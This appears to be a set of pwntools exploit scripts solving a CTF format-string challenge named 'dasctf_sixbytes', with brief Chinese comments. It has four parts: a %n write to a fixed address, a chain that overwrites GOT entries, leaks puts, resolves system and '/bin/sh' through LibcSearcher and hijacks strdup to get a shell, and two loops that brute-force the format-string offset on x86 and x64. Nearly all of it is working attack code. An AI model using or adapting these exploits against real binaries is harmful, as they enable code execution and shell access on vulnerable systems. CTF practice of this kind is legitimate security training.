from pwn import *
elf=ELF('./dasctf_sixbytes')
io=remote('dasctf_sixbytes.challenge.ctf.show',28091)
fm=0x0804A030
payload=p32(fm)+(b"a"*12)+(b"%7$n")  # %x$n:将字符数量赋值给给第x个地址,也就是fm  len(fm)=4  x为偏移
io.sendline(payload)
io.interactive()

from pwn import *
from LibcSearcher import *
elf=ELF('./dasctf_sixbytes')
io=remote("dasctf_sixbytes.challenge.ctf.show",28070)
elf_got=elf.got["memset"]
main=elf.sym["main"]
payload = fmtstr_payload(8, {elf_got: main})
io.recvuntil("please input name:\n")
io.sendline(payload)
io.recvuntil("input size of motto:\n")
io.sendline(b'1')
payload=(b'aaaa%9$s')+p64(elf.got['puts'])
io.recvuntil("please input name:\n")
io.sendline(payload)
io.recvuntil('aaaa')
elf_addr=u64(io.recv(6).ljust(8,b'\x00'))
print(hex(elf_addr))
libc=LibcSearcher('puts',elf_addr)
libcbase=elf_addr-libc.dump('puts')
system_addr=libcbase+libc.dump('system')
bin_sh=libcbase+libc.dump('str_bin_sh')
print(hex(system_addr))
print(hex(bin_sh))
elf_got=elf.got["strdup"]
x=system_addr >> 16 & 0xffff
y=system_addr & 0xffff
print(x,y)
if x>y:
   payload=flat('%'+str(y)+'c%12$hn%'+str(x-y)+'c%13$hn').ljust(32,b'a')+p64(elf_got+2)+p64(elf_got)
if x<y:
   payload=flat('%'+str(x)+'c%12$hn%'+str(y-x)+'c%13$hn').ljust(32,b'a')+p64(elf_got+2)+p64(elf_got)
io.recvuntil("please input name:\n")
io.sendline(payload)
io.interactive()

#x86计算偏移的脚本
from pwn import *
import sys
i = 0
#X86
while(True):
    r = process(sys.argv[1])
    r.sendline('AAAA-' + '%p-' * i)
    recv = r.recv()
    if '0x41414141' in recv:
        print("distance is {}".format(i))
        break
    if 'AAAA' not in recv :
        i = i - 1
    i += 1

#x64计算偏移的脚本
from pwn import *
import sys
i = 0
#X64
while(True):
    r = process(sys.argv[1])
    r.sendline('AAAAAAAA-' + '%p-' * i)
    recv = r.recv()
    if '0x4141414141414141' in recv:
        print("distance is {}".format(i))
        break
    if 'AAAAAAAA' not in recv :
        i = i - 1
    i += 1